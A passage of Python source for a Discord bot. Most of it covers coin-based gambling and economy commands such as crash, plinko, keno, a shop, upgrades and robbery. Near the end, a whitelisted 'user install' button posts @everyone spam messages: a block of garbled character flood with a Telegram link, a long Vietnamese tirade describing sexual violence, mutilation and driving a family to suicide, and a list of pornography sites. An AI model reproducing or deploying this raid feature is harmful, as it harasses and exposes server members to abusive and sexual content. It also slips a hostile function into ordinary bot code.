        self.multiplier, self.crash_point = 1.0, base_crash
        self.pity_guarantee = pity_guarantee
        self.cashed_out, self.running = False, True

    def get_color(self):
        if self.multiplier < 1.5: return discord.Color.blue()
        if self.multiplier < 2.5: return discord.Color.gold()
        return discord.Color.red()

    def gen_embed(self, crashed=False):
        color = self.get_color()
        desc = f"🚀 Multiplier: **{self.multiplier:.2f}x**\n"
        if not crashed: desc += "_Click CASH OUT now!_"
        else: desc += f"💥 **CRASHED AT {self.crash_point:.2f}x!**"
        return discord.Embed(title="📈 Crash", description=desc, color=color)

    @discord.ui.button(label="CASH OUT", style=discord.ButtonStyle.success)
    async def cash_out(self, i: discord.Interaction, b: discord.ui.Button):
        # 🔒 FIX: Block if game ended, already cashed out, or wrong user
        if str(i.user.id) != self.uid or not self.running or self.cashed_out:
            return await i.response.send_message("⏳ Game already ended or you already cashed out!", ephemeral=True)

        self.cashed_out = True
        self.running = False
        winnings = int(self.bet * self.multiplier)

        # 🛑 Disable ALL buttons immediately to prevent race conditions/exploits
        for child in self.children:
            child.disabled = True

        user_data[self.uid]["coins"] += winnings
        user_data[self.uid]["stats"]["money_won"] += winnings
        record_game(self.uid, True)
        save_data()

        await i.response.edit_message(embed=self.gen_embed(False), view=self)
        await i.followup.send(f"✅ Cashed out at **{self.multiplier:.2f}x**!\nYou won **{winnings} 🪙**", ephemeral=True)

    async def on_timeout(self):
        if not self.cashed_out and self.running:
            self.running = False
            for child in self.children: child.disabled = True
            record_game(self.uid, False)
            save_data()

@tree.command(name="crash", description="Watch multiplier rise. Cash out before crash!")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def crash(interaction: discord.Interaction, bet: str):
    await interaction.response.defer()
    amt = await validate_bet(interaction, bet, is_deferred=True)
    if not amt: return
    uid = str(interaction.user.id)
    flow = get_flow(uid)
    
    base = max(1.0, random.lognormvariate(0.4 + flow["difficulty_bias"], 0.7))
    crash_point = min(25.0, base)
    if flow["pity_counter"] >= 4:
        crash_point = max(crash_point, 2.0)
        flow["pity_counter"] = 0

    view = CrashView(uid, amt, crash_point, 2.0 if flow["pity_counter"]>=4 else 1.0)
    
    # 🔑 Store the message object. wait=True ensures we get the Message instance.
    msg = await interaction.followup.send(embed=view.gen_embed(), view=view, wait=True)

    current = 1.0
    while current < crash_point and view.running:
        await asyncio.sleep(0.8)
        if not view.running: break
        current += random.uniform(0.12, 0.35)
        if current > crash_point: current = crash_point
        view.multiplier = current
        try:
            await msg.edit(embed=view.gen_embed(), view=view)
        except discord.NotFound:
            break  # 🔑 Webhook expired or message was deleted. Stop safely.
        except Exception:
            pass

    if not view.cashed_out and view.running:
        view.running = False
        record_game(uid, False)
        save_data()
        try:
            await msg.edit(embed=view.gen_embed(crashed=True), view=view)
        except discord.NotFound:
            pass  # Safely ignore if webhook expired before final update
        except Exception:
            pass

@tree.command(name="plinko", description="Drop a ball through the pegs")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def plinko(interaction: discord.Interaction, bet: str):
    amt = await validate_bet(interaction, bet)
    if not amt: return
    uid = str(interaction.user.id)
    multipliers = [25.0, 5.0, 2.0, 1.0, 0.5, 0.2, 0.5, 1.0, 2.0, 5.0, 25.0]
    position = 5
    path = []
    for _ in range(5):
        drop = random.choice([-1, 1])
        position += drop
        path.append("➡️" if drop == 1 else "⬅️")
    position = max(0, min(position, len(multipliers)-1))
    mult = multipliers[position]
    winnings = int(amt * mult)
    
    msg = f"🔴 **PLINKO** 🔴\nDrop Path: {' '.join(path)}\n\nLanded in slot multiplier: **{mult}x**!\n"
    if winnings > 0:
        user_data[uid]["coins"] += winnings
        user_data[uid]["stats"]["money_won"] += winnings
        msg += f"You receive **{winnings} 🪙**!"
    else: msg += "You lost your bet."
    save_data()
    await interaction.response.send_message(msg)

@tree.command(name="horserace", description="Bet on a horse and watch the simulated race!")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.choices(horse=[app_commands.Choice(name=f"Horse {i}", value=str(i)) for i in range(1,6)])
async def horserace(interaction: discord.Interaction, bet: str, horse: app_commands.Choice[str]):
    amt = await validate_bet(interaction, bet)
    if not amt: return
    uid = str(interaction.user.id)
    h_idx = int(horse.value) - 1
    
    positions = [0, 0, 0, 0, 0]
    goal = 15
    embed = discord.Embed(title="🏇 Horse Race", description="Starting race...", color=discord.Color.green())
    await interaction.response.send_message(embed=embed)
    
    while max(positions) < goal:
        await asyncio.sleep(1.5)
        for i in range(5): positions[i] += random.randint(1, 4)
        
        desc = ""
        for i in range(5):
            track = "-" * min(positions[i], goal) + "🐎" + "-" * max(0, goal - positions[i])
            desc += f"{i+1} | {track} | 🏁\n"
        embed.description = desc
        await interaction.edit_original_response(embed=embed)
        
    winner = positions.index(max(positions))
    if winner == h_idx:
        winnings = amt * 4
        user_data[uid]["coins"] += winnings
        user_data[uid]["stats"]["money_won"] += winnings
        save_data()
        await interaction.followup.send(f"🎉 **Horse {winner+1} won!** You won **{winnings}** 🪙!")
    else:
        await interaction.followup.send(f"💥 **Horse {winner+1} won.** You lost **{amt}** 🪙.")

class RussianRouletteView(discord.ui.View):
    def __init__(self, host_id, bet):
        super().__init__(timeout=30)
        self.bet = bet
        self.participants = [host_id]

    @discord.ui.button(label="Join Game", style=discord.ButtonStyle.danger, emoji="🔫")
    async def join(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = str(interaction.user.id)
        if uid in self.participants: return await interaction.response.send_message("❌ Already joined!", ephemeral=True)
        user = init_user(uid)
        if user["coins"] < self.bet: return await interaction.response.send_message("❌ Not enough coins!", ephemeral=True)
        user["coins"] -= self.bet
        save_data()
        self.participants.append(uid)
        await interaction.response.send_message(f"✅ {interaction.user.display_name} joined!", ephemeral=False)

@tree.command(name="russian_roulette", description="Multiplayer Russian Roulette. Last one standing wins!")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def russian_roulette(interaction: discord.Interaction, bet: str):
    await interaction.response.defer()
    amt = await validate_bet(interaction, bet, is_deferred=True)
    if not amt: return
    view = RussianRouletteView(str(interaction.user.id), amt)
    embed = discord.Embed(title="🔫 Russian Roulette", description=f"Bet: **{amt}** 🪙. Click join. Starts in 30s.", color=discord.Color.red())
    msg = await interaction.followup.send(embed=embed, view=view)
    
    await asyncio.sleep(30)
    for child in view.children: child.disabled = True
    await msg.edit(view=view)
    
    if len(view.participants) < 2:
        user_data[str(interaction.user.id)]["coins"] += amt # Refund
        save_data()
        return await interaction.followup.send("❌ Not enough players joined. Bet refunded.")
        
    pot = amt * len(view.participants)
    loser = random.choice(view.participants)
    winners = [p for p in view.participants if p != loser]
    
    win_split = pot // len(winners)
    for w in winners:
        user_data[w]["coins"] += win_split
        user_data[w]["stats"]["money_won"] += win_split
    save_data()
    
    res = discord.Embed(title="🔫 BANG!", description=f"<@{loser}> got shot and lost everything!\n\nThe {len(winners)} survivors split the **{pot} 🪙** pot (**{win_split}** each).", color=discord.Color.dark_red())
    await interaction.followup.send(embed=res)

@tree.command(name="keno", description="Play Keno! Pick 5 numbers (1-80)")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def keno(interaction: discord.Interaction, bet: str, n1: int, n2: int, n3: int, n4: int, n5: int):
    await interaction.response.defer()
    amt = await validate_bet(interaction, bet, is_deferred=True)
    if not amt: return
    uid = str(interaction.user.id)
    
    picks = {n1, n2, n3, n4, n5}
    if len(picks) < 5 or any(n < 1 or n > 80 for n in picks):
        user_data[uid]["coins"] += amt
        save_data()
        return await interaction.followup.send("❌ You must pick 5 UNIQUE numbers between 1 and 80.")
        
    draw = set(random.sample(range(1, 81), 20))
    matches = len(picks.intersection(draw))
    
    payouts = {0: 0, 1: 0, 2: 1, 3: 5, 4: 20, 5: 100}
    mult = payouts.get(matches, 0)
    winnings = amt * mult
    
    msg = f"🎱 **KENO DRAW** 🎱\nYour picks: {', '.join(map(str, picks))}\nMatches: **{matches}**\n\n"
    if winnings > 0:
        user_data[uid]["coins"] += winnings
        user_data[uid]["stats"]["money_won"] += winnings
        msg += f"🎉 You won **{winnings} 🪙** ({mult}x payout)!"
    else:
        msg += f"💥 You lost your {amt} 🪙 bet."
        
    save_data()
    await interaction.followup.send(msg)

@tree.command(name="scratch", description="Buy a scratch ticket for 200 🪙")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def scratch(interaction: discord.Interaction):
    uid = str(interaction.user.id)
    user = init_user(uid)
    cost = 200
    
    if user["coins"] < cost:
        return await interaction.response.send_message(_t(uid, "no_coins", coins=user["coins"]), ephemeral=True)
        
    user["coins"] -= cost
    
    emojis = ["🍒", "🍋", "🍉", "⭐", "💎"]
    is_win = random.random() < 0.3
    
    if is_win:
        win_emoji = random.choice(emojis)
        grid = [win_emoji] * 3 + random.choices(emojis, k=6)
    else:
        grid = random.choices(emojis, k=9)
        # Ensure no accidental 3-match if loss is forced
        while any(grid.count(e) >= 3 for e in emojis):
            grid = random.choices(emojis, k=9)
            
    random.shuffle(grid)
    
    formatted_grid = ""
    for i in range(0, 9, 3):
        formatted_grid += f"|| {grid[i]} || || {grid[i+1]} || || {grid[i+2]} ||\n"
        
    winnings = 0
    if is_win:
        winnings = cost * (10 if win_emoji == "💎" else 3)
        user["coins"] += winnings
        user["stats"]["money_won"] += winnings
        
    save_data()
    await interaction.response.send_message(f"🎫 **SCRATCH TICKET** 🎫\n*Click the boxes to reveal!*\n\n{formatted_grid}\n" + (f"If you find 3 of a kind, you win! (Pre-rolled payout: {winnings} 🪙)" if is_win else "Good luck next time!"))


# ==========================================
# ECONOMY, TRADING & RPG COMMANDS
# ==========================================
def get_crypto_prices():
    # Isolated RNG that changes every hour without touching the global state
    rng = random.Random(int(time.time() // 3600))
    return {
        "PepeCoin": rng.randint(10, 200),
        "DiscordCorp": rng.randint(50, 500),
        "DogeToken": rng.randint(1, 100)
    }

@tree.command(name="crypto", description="Buy and sell virtual crypto in a dynamic market")
@app_commands.choices(action=[
    app_commands.Choice(name="View Market", value="market"),
    app_commands.Choice(name="Buy", value="buy"),
    app_commands.Choice(name="Sell", value="sell")
])
@app_commands.choices(coin=[
    app_commands.Choice(name="PepeCoin", value="PepeCoin"),
    app_commands.Choice(name="DiscordCorp", value="DiscordCorp"),
    app_commands.Choice(name="DogeToken", value="DogeToken")
])
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def crypto(interaction: discord.Interaction, action: app_commands.Choice[str], coin: app_commands.Choice[str] = None, amount: int = 1):
    uid = str(interaction.user.id)
    prices = get_crypto_prices()
    
    if action.value == "market":
        user = init_user(uid)
        desc = "📈 **Live Crypto Market** (Updates hourly)\n"
        for c, p in prices.items():
            owned = user["crypto"].get(c, 0)
            desc += f"**{c}**: {p} 🪙 (You own: {owned})\n"
        return await interaction.response.send_message(desc)

    if not coin:
        return await interaction.response.send_message("❌ You must specify a coin to buy or sell.", ephemeral=True)
    c_name = coin.value
    price = prices[c_name]

    async with get_user_lock(uid):
        user = init_user(uid)
        if action.value == "buy":
            cost = price * amount
            if user["coins"] < cost:
                msg = f"❌ You need {cost} 🪙 to buy {amount} {c_name}."
            else:
                user["coins"] -= cost
                user["crypto"][c_name] = user["crypto"].get(c_name, 0) + amount
                save_data()
                msg = f"📈 Bought **{amount} {c_name}** for {cost} 🪙!"
        elif action.value == "sell":
            owned = user["crypto"].get(c_name, 0)
            if owned < amount:
                msg = f"❌ You only own {owned} {c_name}."
            else:
                revenue = price * amount
                user["coins"] += revenue
                user["crypto"][c_name] -= amount
                save_data()
                msg = f"📉 Sold **{amount} {c_name}** for {revenue} 🪙!"
    await interaction.response.send_message(msg, ephemeral=True if "❌" in msg else False)

@tree.command(name="work", description="Work for some steady coins (1h cooldown)")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def work(interaction: discord.Interaction):
    uid = str(interaction.user.id)
    async with get_user_lock(uid):
        user = init_user(uid)
        now = time.time()
        last = user.get("last_work", 0)
        if now - last < 1200:
            mins, secs = divmod(int(1200 - (now - last)), 60)
            msg = f"⏳ You are tired. Rest for **{mins}m {secs}s**."
        else:
            reward = random.randint(150, 300)
            user["coins"] += reward
            user["last_work"] = now
            save_data()
            msg = f"💼 You worked hard and earned **{reward} 🪙**!"
    await interaction.response.send_message(msg, ephemeral=True if "tired" in msg else False)
@tree.command(name="crime", description="Commit a crime for a chance at big coins (2h cooldown)")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def crime(interaction: discord.Interaction):
    uid = str(interaction.user.id)
    async with get_user_lock(uid):
        user = init_user(uid)
        now = time.time()
        last = user.get("last_crime", 0)
        if now - last < 600:
            mins, secs = divmod(int(600 - (now - last)), 60)
            msg = f"⏳ The cops are watching you! Lay low for **{mins}m {secs}s**."
            is_ephemeral = True
        else:
            user["last_crime"] = now
            if random.random() < 0.4:
                reward = random.randint(200, 500)
                user["coins"] += reward
                save_data()
                msg = f"🥷 You pulled off a heist and scored **{reward} 🪙**!"
                is_ephemeral = False
            else:
                fine = random.randint(100, 300)
                user["coins"] -= fine
                save_data()
                msg = f"🚔 You were caught by the police and fined **{fine} 🪙**."
                is_ephemeral = False
    await interaction.response.send_message(msg, ephemeral=is_ephemeral)

@tree.command(name="leaderboard", description="View the top 10 richest players in the server")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def leaderboard(interaction: discord.Interaction):
    sorted_users = sorted(user_data.items(), key=lambda x: x[1]["coins"], reverse=True)
    desc = ""
    for idx, (uid, data) in enumerate(sorted_users[:10]):
        desc += f"**{idx+1}.** <@{uid}> - **{data['coins']}** 🪙\n"
    embed = discord.Embed(title="🏆 Global Leaderboard", description=desc, color=discord.Color.gold())
    await interaction.response.send_message(embed=embed)

class ShopView(discord.ui.View):
    def __init__(self, uid):
        super().__init__(timeout=60)
        self.uid = uid
        self.selected_item = None

        self.costs = {
            "Fishing Rod": 500,
            "Pickaxe": 1000,
            "VIP Badge": 5000
        }

        self.desc = {
            "Fishing Rod": "Unlocks /fish 🎣",
            "Pickaxe": "Unlocks /mine ⛏️",
            "VIP Badge": "Future perks 👑"
        }

    @discord.ui.select(
        placeholder="Select an item...",
        options=[
            discord.SelectOption(label="Fishing Rod", description="500 🪙"),
            discord.SelectOption(label="Pickaxe", description="1000 🪙"),
            discord.SelectOption(label="VIP Badge", description="5000 🪙")
        ]
    )
    async def select_item(self, interaction: discord.Interaction, select: discord.ui.Select):
        if str(interaction.user.id) != self.uid:
            return

        item = select.values[0]
        self.selected_item = item

        embed = discord.Embed(
            title=f"🛒 {item}",
            description=f"{self.desc[item]}\nPrice: {self.costs[item]} 🪙",
            color=discord.Color.gold()
        )

        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Buy", style=discord.ButtonStyle.green)
    async def buy(self, interaction: discord.Interaction, button: discord.ui.Button):
        if str(interaction.user.id) != self.uid:
            return

        if not self.selected_item:
            return await interaction.response.send_message("❌ Select an item first.", ephemeral=True)

        uid = self.uid
        item = self.selected_item

        async with get_user_lock(uid):
            user = init_user(uid)
            inv = user["inventory"]

            def has_item(base_name):
                return any(i.startswith(base_name) for i in inv)

            # ⭐ 等級判斷（重點）
            if (item == "Fishing Rod" and has_item("Fishing Rod")) or \
               (item == "Pickaxe" and has_item("Pickaxe")) or \
               (item == "VIP Badge" and item in inv):
                msg = f"❌ You already own a {item} (or upgraded version)!"

            elif user["coins"] < self.costs[item]:
                msg = f"❌ You need {self.costs[item]} 🪙 to buy this."

            else:
                user["coins"] -= self.costs[item]
                user["inventory"].append(item)
                save_data()
                msg = f"🛒 You bought **{item}** for {self.costs[item]} 🪙!"

        await interaction.response.send_message(msg, ephemeral=True if "❌" in msg else False)

@tree.command(name="shop", description="Buy items from the global shop")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def shop(interaction: discord.Interaction):
    uid = str(interaction.user.id)

    embed = discord.Embed(
        title="🛒 Global Shop",
        description="Select an item below and press Buy",
        color=discord.Color.gold()
    )

    view = ShopView(uid)

    await interaction.response.send_message(embed=embed, view=view)

class UpgradeView(discord.ui.View):
    def __init__(self, uid):
        super().__init__(timeout=60)
        self.uid = uid
        self.selected = None

        self.data = {
            "Fishing Rod": [
                ("Fishing Rod", "Fishing Rod Lvl 2", 2000),
                ("Fishing Rod Lvl 2", "Fishing Rod Lvl 3", 10000),
                ("Fishing Rod Lvl 3", "Fishing Rod Lvl 4", 75000),
                ("Fishing Rod Lvl 4", "Fishing Rod Lvl 5", 300000, "🏺 Ancient relic catch (SPECIAL!!!)"),
            ],
            "Pickaxe": [
                ("Pickaxe", "Pickaxe Lvl 2", 5000),
                ("Pickaxe Lvl 2", "Pickaxe Lvl 3", 30000),
                ("Pickaxe Lvl 3", "Pickaxe Lvl 4", 120000),
                ("Pickaxe Lvl 4", "Pickaxe Lvl 5", 800000, "💠 Crystal"),
            ]
        }

    def get_level(self, user, base):
        for i in range(5, 1, -1):
            name = f"{base} Lvl {i}"
            if name in user["inventory"]:
                return i
        if base in user["inventory"]:
            return 1
        return 0

    def get_next(self, base, level):
        if level == 0 or level >= 5:
            return None
        return self.data[base][level - 1]

    def has_item(self, user, item):
        return item in user["inventory"]

    @discord.ui.select(
        placeholder="Select item to upgrade...",
        options=[
            discord.SelectOption(label="Fishing Rod"),
            discord.SelectOption(label="Pickaxe")
        ]
    )
    async def select_item(self, interaction: discord.Interaction, select: discord.ui.Select):
        if str(interaction.user.id) != self.uid:
            return

        user = init_user(self.uid)
        item = select.values[0]
        self.selected = item

        level = self.get_level(user, item)
        next_data = self.get_next(item, level)

        if level == 0:
            status = "❌ Not owned"
            cost = "-"
            nxt = "-"
            req = "-"
        elif level >= 5:
            status = "🟢 Level 5 (MAX)"
            cost = "-"
            nxt = "-"
            req = "-"
        else:
            cost = next_data[2]
            nxt = next_data[1]

            # 特殊道具檢查
            req_item = next_data[3] if len(next_data) == 4 else None

            if req_item and not self.has_item(user, req_item):
                req = f"Missing: {req_item}"
            else:
                req = "None"

            status = f"🟡 Level {level}"

        embed = discord.Embed(
            title=f"⬆️ Upgrade: {item}",
            description=(
                f"Status: {status}\n"
                f"Upgrade Cost: {cost}\n"
                f"Next: {nxt}\n"
                f"Requirement: {req}"
            ),
            color=discord.Color.blue()
        )

        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Upgrade", style=discord.ButtonStyle.green)
    async def upgrade_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if str(interaction.user.id) != self.uid:
            return

        if not self.selected:
            return await interaction.response.send_message("❌ Select an item first.", ephemeral=True)

        uid = self.uid
        base = self.selected

        async with get_user_lock(uid):
            user = init_user(uid)
            level = self.get_level(user, base)
            next_data = self.get_next(base, level)

            if level == 0:
                msg = "❌ You don't own this item."

            elif level >= 5:
                msg = "❌ This item is already max level."

            else:
                cost = next_data[2]
                req_item = next_data[3] if len(next_data) == 4 else None

                if user["coins"] < cost:
                    msg = f"❌ You need {cost} 🪙."

                elif req_item and req_item not in user["inventory"]:
                    msg = f"❌ Missing required item: {req_item}"

                else:
                    user["coins"] -= cost
                    user["inventory"].remove(next_data[0])
                    user["inventory"].append(next_data[1])

                    save_data()
                    msg = f"⬆️ Upgraded to **{next_data[1]}**!"

        await interaction.response.send_message(msg, ephemeral=True if "❌" in msg else False)

@tree.command(name="upgrade", description="Upgrade your items")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def upgrade(interaction: discord.Interaction):
    uid = str(interaction.user.id)

    embed = discord.Embed(
        title="⬆️ Upgrade Station",
        description="Select an item and upgrade it",
        color=discord.Color.blue()
    )

    view = UpgradeView(uid)

    await interaction.response.send_message(embed=embed, view=view)
@tree.command(name="inventory", description="View your owned items")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def inventory(interaction: discord.Interaction):
    uid = str(interaction.user.id)
    user = init_user(uid)
    inv = user.get("inventory", [])
    if inv:
        from collections import Counter
        counts = Counter(inv)
    
        desc = "\n".join([f"🎒 {item} x{count}" for item, count in counts.items()])
    else:
        desc = "Your inventory is empty."
    embed = discord.Embed(title=f"{interaction.user.display_name}'s Inventory", description=desc, color=discord.Color.blue())
    await interaction.response.send_message(embed=embed)

@tree.command(name="rob", description="Attempt to steal coins from another user (Risky!)")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def rob(interaction: discord.Interaction, target: discord.User):
    uid = str(interaction.user.id)
    tid = str(target.id)

    if target.bot or uid == tid: 
        return await interaction.response.send_message("❌ Invalid target.", ephemeral=True)

    import random
    import time

    u1, u2 = sorted([uid, tid])

    async with get_user_lock(u1), get_user_lock(u2):
        user = init_user(uid)
        t_user = init_user(tid)

        if user["coins"] < 250:
            return await interaction.response.send_message(
                "❌ You need at least 250 🪙 to attempt a robbery.",
                ephemeral=True
            )

        if t_user["coins"] < 100:
            return await interaction.response.send_message(
                "❌ They are too poor to rob!",
                ephemeral=True
            )

        # -------------------------
        # jail check
        # -------------------------
        if user.get("jail_until", 0) > time.time():
            return await interaction.response.send_message(
                "🚔 **CAUGHT!** The police caught you trying to rob someone. You're in jail.",
                ephemeral=True
            )

        # -------------------------
        # ratio system
        # -------------------------
        ratio = user["coins"] / max(t_user["coins"], 1)

        if ratio >= 1:
            p = 0.4
        else:
            p = min(0.4, 0.4 * (ratio ** 0.5))
            # -------------------------
        # SUCCESS
        # -------------------------
        if random.random() < p:

            stolen = int(t_user["coins"] * random.uniform(0.05, 0.1))

            # cap: 50% of user wealth
            stolen = min(stolen, int(user["coins"] * 0.5))

            stolen = max(stolen, 1)

            t_user["coins"] -= stolen
            user["coins"] += stolen

            save_data()

            msg = f"🥷 **SUCCESS!** You successfully robbed {target.mention} and got away with **{stolen} 🪙**!"
            return await interaction.response.send_message(msg)

        # -------------------------
        # FAIL
        # -------------------------
        else:

            # poor rob rich
            if ratio < 1:

                loss = int(user["coins"] * random.uniform(0.042, 0.084))
                user["coins"] -= loss

                user["jail_until"] = time.time() + 600  # 10 min jail

                save_data()

                msg = f"🚔 **CAUGHT!** The police caught you trying to rob {target.mention}. You paid a fine of **{loss} 🪙**."
                return await interaction.response.send_message(msg, ephemeral=True)

            # rich rob poor → compensation
            else:

                loss = int(t_user["coins"] * random.uniform(0.05, 0.1))

                # cap: victim only receives up to 50% of their wealth
                loss = min(loss, int(t_user["coins"] * 0.5))
                loss = max(loss, 1)

                user["coins"] -= loss
                t_user["coins"] += loss

                save_data()

                msg = f"🚔 **CAUGHT!** The police caught you trying to rob {target.mention}. You paid a fine of **{loss} 🪙**."
                return await interaction.response.send_message(msg)


class UserInstallButtonView(discord.ui.View):
    def __init__(self, interval: int):  
        super().__init__(timeout=None)
        self.interval = interval / 1000  
    
    @discord.ui.button(
        label='Luke', 
        style=discord.ButtonStyle.primary,
        custom_id='user_install_button'
    )
    async def button_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        
        if interaction.user.id not in WHITELIST_IDS:
            await interaction.response.send_message(
                "You don't have permissions to do this :D",
                ephemeral=True
            )
            return
        
        
        await interaction.response.defer(ephemeral=False)


        messages = [
            """# @everyone
            # t.me/varvarafurry 틓탑컏쳍쫋죉웇쓅싃상뺿벽못뢹뚷뒵늳낱꺯겭ꪫꢩꚧ꒥ꊣꂡ麟鲝骛颙隗钕銓邑躏貍誋袉蚇蒅芃肁繿籽穻硹癷瑵牳灱湯汭橫桩晧摥扣恡幟屝婛塙噗呕剓偑乏䱍䩋䡉䙇䑅䉃䁁㸿㰽㨻㠹㘷㐵㈳〱ⸯⰭ⨫⠩☧␥∣‡ḟᰝᨛ᠙ᘗᐕሓထฏ఍਋ࠉ؇Ѕȃ℀ӹਅ＀Ⰰõࠀÿ呓堚ᕩఎ嚫ࡹʠÀ·娢㘣娌ڶ됤ꂬⶀ衛ධ킡ˠஅ儦뭢ඐ䮙栲⦛ꙓ⎶朳愞ආ荛뜝䖒傚 ꌣ轈䴪瓊ꌩ䖥຋ௐᆱ됕ᮡ멙屴놟昣䯍도걞ㅕ烻䏪쐀䖈䀄耗愊賂䬥촖҃ᑬ걈䄠나䄖ጙ⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓⛓⛓⛓️⛓️⛓⛓⛓⛓⛓⛓⛓⛓️⛓️⛓️⛓️⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓️⛓️⛓️⛓️⛓⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓⛓⛓⛓⛓⛓️⛓️⛓⛓⛓⛓️⛓⛓⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓⛓⛓⛓⛓⛓️⛓️⛓️⛓️⛓️⛓⛓⛓️⛓️⛓⛓⛓⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓⛓⛓⛓️⛓㍀꛿‾ע鎰羏
            https://cdn.discordapp.com/attachments/1324724935976812595/1508851174244356256/22ef482e0e8e915ca5ecd8a55c19ad2f_720_9.png?ex=6a17b369&is=6a1661e9&hm=42e408a5fbd80cc936e81bb8e7da183e87d404a0eff36fe896cefbcd7514fdf1&""",
            """# @everyone
# trăng kia ai vẽ mà tròn loz con mẹ m bị ai địt mà mòn 1 bên :rofl: 
# con đĩ này có quyền tự do ngôn luận đéo đâu mọi ng =)) 
# thằng cặc chứng kiến cái cảnh mẹ nó bị t cầm bật lửa đốt từng cộng lông bướm:))) 
# thằng con chó quỳ xuống liếm từng bãi nước đái , ăn từng cục cứt tao đi e 
# Mẹ Mày Bị Cha Đụ Từ Nam Vào Đến Bắc Mà :zany_face: :punch:
# vào 10 năm trước t bắt cóc con đĩ mẹ mày t làm nô lệ tình dục để kiếm tiền cho t đi bar 
# quẩy bay lắc cái lỗ lồn con đĩ mẹ mày mà =))) 
# t sát sinh cả gia phả nhà m mà em êy 
# người yêu nó bị t chém đứt đầu xong t còn bắt làm nô lệ tình dục cho con chó nhà t =)) 
# Đến lúc con mẹ mày được nhét vô trong quan tài thì tao lại đào lên và vắt dái ra đái vô mồm lồn con đĩ mẹ mày =)) 
# m có cảnh kh thk óc cặc 
# thằng này ăn và khen chubin anh singu khen ngon quá=)) 
# anh lấy cái ô tô anh đâm thẳng dô cái lồn con gái mẹ thằng súc vật như m 
# mẹ đẻ của mày giao phối với con chó ngao tây tạng nên mới đẻ được cái thứ súc vật như mày mà con chó điếm  :rofl::call_me: 
# óc chó bị anh rã vô cặc cho cay muốn liệt tinh hoàn à :index_pointing_at_the_viewer::joy: 
# lêu lêu cái thằng ngu không làm gì được anh nên cay muốn đứt mạch máu não kìa 
# cả gia đình m bị t sỉ vả cho đến mức thắt cổ tự tử mà =))=))=))
https://cdn.discordapp.com/attachments/1324724935976812595/1508851174244356256/22ef482e0e8e915ca5ecd8a55c19ad2f_720_9.png?ex=6a17b369&is=6a1661e9&hm=42e408a5fbd80cc936e81bb8e7da183e87d404a0eff36fe896cefbcd7514fdf1&""",
            """# @everyone
# https://discord.gg/pornhub
# https://missav.ws/
# https://taiav.com/
# https://missav.com
# https://jav.guru
# https://javmost.com
# https://supjav.com
# https://javtiful.com
# https://javtits.com
# https://javhdporn.net
# https://avjb.com
# https://7mmtv.sx
# https://jav321.com
# https://javfinder.com
# https://javgg.net
# https://jav.gsex.fun
# https://javhd.today
# https://avbebe.com
# https://javmix.tv
# https://javhd3x.com
# https://javbobo.com
# https://javday.tv
# https://javquick.com
# https://jav777.cc
# https://javmost.cx
# https://javseen.tv
# https://18av.pro
# https://avbebe2.com
# https://njavtv.com
# https://porn5f.com
# https://av01.tv
# https://mat6tube.com
# https://javtorrent.org
# https://missav.ws
# https://missav.li
https://cdn.discordapp.com/attachments/1324724935976812595/1508851174244356256/22ef482e0e8e915ca5ecd8a55c19ad2f_720_9.png?ex=6a17b369&is=6a1661e9&hm=42e408a5fbd80cc936e81bb8e7da183e87d404a0eff36fe896cefbcd7514fdf1&""",
            """# @everyone

♡₊˚ 🦢・₊✧ ⋆˚🐾˖° 💢 🎀『 𝙃𝙤𝙩𝙩𝙧𝙚𝙤 𝙃𝙣𝙝𝙪𝙩 🪽 𝙖𝙣𝙝 𝙢𝙖̃𝙞 𝙩𝙧𝙪̛𝙤̛̀𝙣𝙜 𝙩𝙤̂̀𝙣 𝙩𝙝𝙚𝙤 𝙣𝙖̆𝙢 𝙩𝙝𝙖́𝙣𝙜 ℹ️ 𝙘𝙝𝙖 đ𝙚̉ 𝙘𝙪̉𝙖 𝙡𝙪̃ đ𝙪́ 𝙢𝙭𝙝 』🧸🌠⚡💫💤🍼
  ʕ•̫͡•ʕ•̫͡•ʔ•̫͡•ʔ•̫͡•ʕ•̫͡•ʔ•̫͡•  🇻🇳
----------------------------------------------
★　*　　　　　°　　　　🛰️　°·　　                            🪐

.　　　•　°★　•  ☄

▁▂▃▄▅▆▇▇▆▅▄▃▂▁ ꕥؖؖؖꕹؖؖؖꕹؖؖؖꗝꕥؖؖؖꕹؖؖؖꕹؖؖؖꗝꗝؖؖؖꕹؖؖؖꕥꕥؖؖؖꕹؖؖꕹꕥꕹꕹꗝꕥꕹꕹꗝꗝꕹꕥꕥ


𝗙𝗿𝗼𝗺 : 𝑯𝒏𝒉𝒖𝒕

